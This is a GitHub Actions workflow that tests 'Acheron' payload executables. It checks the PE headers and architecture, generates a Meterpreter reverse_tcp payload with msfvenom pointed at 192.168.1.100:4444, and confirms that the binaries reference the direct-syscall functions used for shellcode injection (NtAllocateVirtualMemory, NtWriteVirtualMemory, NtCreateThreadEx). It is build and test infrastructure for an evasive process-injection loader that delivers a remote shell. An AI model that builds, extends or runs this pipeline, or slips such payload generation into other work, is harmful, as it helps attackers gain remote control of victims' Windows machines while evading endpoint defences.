name: Acheron Payload CI

on:
  workflow_dispatch:
  push:
    paths:
      - 'acheron_*.exe'
      - '.github/workflows/test-payload.yml'

jobs:
  test-payload:
    runs-on: windows-latest
    timeout-minutes: 10
    permissions:
      contents: read
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
      
      - name: List repository files
        run: |
          Write-Host "=== Repository Contents ==="
          Get-ChildItem -Force | Format-Table Name, Length, LastWriteTime
        shell: pwsh
      
      - name: Verify payload exists
        run: |
          $files = Get-ChildItem acheron_*.exe -ErrorAction SilentlyContinue
          if ($files.Count -eq 0) {
            Write-Error "No Acheron EXE found in repository!"
            exit 1
          }
          foreach ($file in $files) {
            Write-Host "Testing: $($file.Name)"
            $size = (Get-Item $file.FullName).Length
            Write-Host "  Size: $size bytes ($([math]::Round($size/1MB, 2)) MB)"
            # Verify PE header
            $bytes = [System.IO.File]::ReadAllBytes($file.FullName)
            if ($bytes[0] -eq 0x4D -and $bytes[1] -eq 0x5A) {
              Write-Host "  ✅ Valid PE header (MZ)"
            } else {
              Write-Error "  ❌ Invalid PE header"
              exit 1
            }
            # Check architecture
            $peOffset = [BitConverter]::ToUInt32($bytes, 0x3C)
            $machine = [BitConverter]::ToUInt16($bytes, $peOffset + 4)
            if ($machine -eq 0x8664) {
              Write-Host "  ✅ Architecture: x64 (0x8664)"
            } else {
              Write-Warning "  ⚠️ Architecture: $([string]::Format('0x{0:X4}', $machine))"
            }
          }
        shell: pwsh
      
      - name: Test msfvenom payload generation
        run: |
          Write-Host "=== Testing msfvenom ==="
          try {
            $output = msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f hex EXITFUNC=thread 2>&1
            if ($output -match "Payload size: (\d+) bytes") {
              Write-Host "  ✅ msfvenom payload generation OK ($($matches[1]) bytes)"
            } else {
              Write-Warning "  msfvenom output: $output"
            }
          } catch {
            Write-Error "  msfvenom failed: $_"
            exit 1
          }
        shell: pwsh
      
      - name: Verify Acheron direct syscalls pattern
        run: |
          Write-Host "=== Checking Acheron syscall patterns ==="
          $files = Get-ChildItem acheron_*.exe
          foreach ($file in $files) {
            $bytes = [System.IO.File]::ReadAllBytes($file.FullName)
            $content = [System.Text.Encoding]::ASCII.GetString($bytes)
            # Check for Acheron imports/strings
            if ($content -match "NtAllocateVirtualMemory") {
              Write-Host "  ✅ Found NtAllocateVirtualMemory reference"
            }
            if ($content -match "NtWriteVirtualMemory") {
              Write-Host "  ✅ Found NtWriteVirtualMemory reference"
            }
            if ($content -match "NtCreateThreadEx") {
              Write-Host "  ✅ Found NtCreateThreadEx reference"
            }
            if ($content -match "acheron") {
              Write-Host "  ✅ Found acheron library reference"
            }
          }
        shell: pwsh